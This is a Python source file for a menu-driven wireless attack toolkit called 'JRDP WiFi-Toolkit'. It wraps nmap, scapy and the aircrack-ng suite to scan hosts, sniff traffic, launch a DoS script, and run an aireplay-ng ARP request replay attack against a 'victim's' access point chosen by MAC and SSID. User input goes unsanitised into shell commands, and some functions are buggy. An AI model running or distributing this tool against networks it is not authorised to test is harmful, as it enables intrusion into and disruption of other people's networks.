import os
import sys
import json
import time
import scapy.all as scapy
import ipaddress
import keyboard
import colorama
import subprocess
from colorama import Fore, Style, init
from scapy.all import *

init()


def main_menu():
    while True:
        if not 'SUDO_UID' in os.environ.keys():
           print(f"{Fore.RED}[!] Try executing JRDP_WiFi-Toolkit as root.{Style.RESET_ALL}")
           exit()
           
        os.system("clear")
        ascii_art()
        print(" 1. Scan WiFi for IP's                 ")
        print(" 2. Show info about WLAN router        ")
        print(" 3. Sniff packets                      ")
        print(" 4. DoS attack                         ")
        print(" 5. ARP Request Replay Attack          ")
        print(" 6. Run Wireshark.                     ")
        print(" 7. Restart wpa-supplicant.            ")
        print(" 8. Monitor mode menu.                 ")
        print(" 9. Restart NetworkManager             ")
        print(" 10.Exit                               ")

        choice = input("Enter your choice (1-10): ")

        if choice == '1':
           scan_wifi_hostnames()
           
        elif choice == '2':
             router_info()
             
        elif choice == '3':
             sniff_packets()
             
        elif choice == '4':
             DoS()
             
        elif choice == '5':
             arp()
             
        elif choice == '6':
             run_wireshark()
             
        elif choice == '7':
             restart_wpa()
             
        elif choice == '8':
             monitor_mode()
             
        elif choice == '9':
             network_manager()
             
        elif choice == '10':
            break
        else:
            print("Invalid choice. Please enter a number between 1 and 8.")


def scan_wifi_hostnames():
    os.system("clear")
    print("SCAN WIFI FOR HOSTNAMES")
    print("\n1.  192.168.0.1/8")
    print("2.  192.168.0.1/16")
    print("3.  192.168.0.1/24")
    print("4. Go to main menu.")

    scan = input("Enter your choice (1-4): ")

    output_file = "outputs/scan.txt"

    if scan == '1':
        network = "192.168.0.1/8"
    elif scan == '2':
        network = "192.168.0.1/16"
    elif scan == '3':
        network = "192.168.0.1/24"
    elif scan == '4':
        main_menu()
        return
    else:
        print(f"{Fore.RED}Invalid choice. Please enter a valid option.{Style.RESET_ALL}")
        return

    try:
        result = subprocess.check_output(["nmap", "-sn", network, "-oN", output_file], universal_newlines=True)
        lines = result.split('\n')

        for line in lines:
            if "Host" in line and "is up" in line:
                parts = line.split()
                ip_address = parts[1]
                hostname_start_index = line.find("(")
                hostname_end_index = line.find(")")
                hostname = line[hostname_start_index + 1:hostname_end_index]
                print(f"{Fore.RED}Hostname: {hostname} | IP Address: {ip_address}{Style.RESET_ALL}")

        print(f"{Fore.GREEN}Scan results have been saved to file: {output_file}{Style.RESET_ALL}")

    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}Error during scanning: {e.output.strip()}{Style.RESET_ALL}")

    with open(output_file, 'w') as txt_file:
        for line in lines:
            txt_file.write(line + '\n')




def router_info():
        result = subprocess.run(['route', '-n'], capture_output=True, text=True, check=True)
        lines = result.stdout.split('\n')
        gateway_info = None
        for line in lines:
            if line.startswith('0.0.0.0'):
                gateway_info = line.split()

        if gateway_info:
            gateway_ip = gateway_info[1]
            print("Router info:")
            print(f"Router IP: {gateway_ip}")
        else:
            print("Cannot find any informations about router...")
        shshhshs = input("Click any key to continue...")



def sniff_packets():
    os.system("sudo airmon-ng")
    interface = input("Select interface: ")

    def packet_callback(packet):
        if IP in packet:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            packet_type = "Unknown"

            if TCP in packet:
                packet_type = "TCP"
            elif UDP in packet:
                packet_type = "UDP"
            elif ICMP in packet:
                packet_type = "ICMP"
            elif DNS in packet:
                packet_type = "DNS"
            elif ARP in packet:
                packet_type = "ARP"

            print(f"Source IP: {Fore.CYAN}{src_ip:<15}{Style.RESET_ALL} {Fore.WHITE}|{Style.RESET_ALL} Destination IP: {Fore.RED}{dst_ip:<15}{Style.RESET_ALL}  {Fore.WHITE}|{Style.RESET_ALL} Packet Type: {Fore.BLUE}{packet_type}{Style.RESET_ALL}")

            with open('outputs/packets.txt', 'a') as file:
                file.write(f"Source IP: {src_ip}, Destination IP: {dst_ip}, Packet Type: {packet_type}\n")

    sniff(iface=interface, prn=packet_callback, store=0)



def DoS():
    os.system("sudo python3 files/DoS.py")



def run_wireshark():
    os.system("sudo wireshark")




def monitor_mode():
        os.system("clear")
        print("\n1.Enable monitor mode.")
        print("2.Disable monitor mode.")
        print("3.Back to main menu.")
        ask = input(Fore.LIGHTGREEN_EX + "Select option: " +Fore.RESET)
        if ask == '1':
          start_monmode()
        elif ask == '2':
            stop_monmode()
        elif choice == '3':
            main_menu()
def start_monmode():
    os.system("sudo airmon-ng")
    interface = input(Fore.LIGHTGREEN_EX + "Select interface:" + Fore.RESET)
    os.system(f"sudo airmon-ng start {interface}")
def stop_monmode():
    os.system("sudo airmon-ng")
    interface = input(Fore.LIGHTGREEN_EX + "Select interface:" + Fore.RESET)
    os.system(f"sudo airmon-ng stop {interface}")




def list_networks():
    try:
        folder_path = 'files'
        os.makedirs(folder_path, exist_ok=True)
        file_path = os.path.join(folder_path, 'networks.txt')
        with open(file_path, 'w') as file:
            try:
                process = subprocess.Popen(['airodump-ng', 'wlan0'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                process.wait()
                output, error = process.communicate()
                file.write(output.decode())

            except KeyboardInterrupt:
                os.kill(process.pid, signal.SIGINT)
                file.write("Scan interrupted by user.")

    except Exception as e:
        print(f"An error occured: {e}")




def restart_wpa():
    os.system("systemctl restart wpa_supplicant")
    print("Successfully restarted wpa_supplicant service.")




def network_manager():
    os.system("sudo systemctl restart NetworkManager")




def arp():
    os.system("clear")
    os.system("sudo airmon-ng")
    inf = input(f"\n{Fore.RED}Select interface You want to use:{Style.RESET_ALL}")
    def get_current_mac(interface):
        try:
            result = subprocess.check_output(["ifconfig", interface]).decode("utf-8")
            mac_address_search = re.search(r"(\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)", result)
            return mac_address_search.group(0) if mac_address_search else None
        except Exception as e:
            return None

    myMAC = get_current_mac(inf)
    os.system("clear")
    os.system(f"sudo timeout 10 airodump-ng --output-format csv -w outputs/wifi {inf}")
    apMAC = input(f"{Fore.RED}Enter victim's access-point MAC address:{Style.RESET_ALL}")
    os.system("clear")
    os.system(f"sudo timeout 10 airodump-ng --output-format csv -w outputs/wifi {inf}")
    ssid = input(f"{Fore.RED}Enter victim's WiFi network SSID:{Style.RESET_ALL}")
    print("Starting ARP replay attack...")
    os.system(f"sudo aireplay-ng --arpreplay -e {ssid} -b {apMAC} -h {myMAC} -x 100 {inf} > outputs/arp.txt")
    time.sleep(5)




def ascii_art():
    colorama.init(autoreset=True)
    ascii_art = colorama.Fore.RED + """
    ██╗    ██╗██╗███████╗██╗    ████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗
    ██║    ██║██║██╔════╝██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝
    ██║ █╗ ██║██║█████╗  ██║       ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║
    ██║███╗██║██║██╔══╝  ██║ v3.0  ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║
    ╚███╔███╔╝██║██║     ██║       ██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║
     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝
                 by JRDP Team     https://github.com/JRDPCN
    """ + colorama.Style.RESET_ALL
    print(ascii_art)



if __name__ == "__main__":
    main_menu()
